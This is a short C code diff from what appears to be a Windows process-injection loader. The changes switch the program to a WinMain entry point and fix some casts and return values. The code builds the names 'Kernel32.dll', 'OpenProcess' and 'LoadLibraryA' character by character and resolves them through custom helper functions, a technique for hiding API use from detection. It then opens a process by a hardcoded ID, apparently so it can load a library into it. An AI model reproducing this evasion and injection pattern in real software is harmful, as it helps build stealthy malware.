@@ -5,9 +5,9 @@
 
 // #pragma comment(linker, "/entry:WinMain")
 
-// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
-//     LPSTR lpCmdLine, int nCmdShow)
-int main()
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
+    LPSTR lpCmdLine, int nCmdShow)
+// int main()
 {
 
     WCHAR kern32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0};
@@ -26,7 +26,7 @@ int main()
 
     pOpenProcess OpenProcess = (pOpenProcess) hlpGetProcAddress(hlpGetModuleHandle(kern32), sOpenProcess);
     if (OpenProcess == NULL)
-        return NULL;
+        return 1;
 
     //DWORD pid = 1364;
     DWORD pid = 37124;
@@ -38,7 +38,7 @@ int main()
 
 
     char loadlib[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
-    pLoadLibraryA LoadLibraryA = hlpGetProcAddress(hlpGetModuleHandle(kern32), loadlib);
+    pLoadLibraryA LoadLibraryA = (pLoadLibraryA) hlpGetProcAddress(hlpGetModuleHandle(kern32), loadlib);
     if (LoadLibraryA == NULL)
         return 1;
 
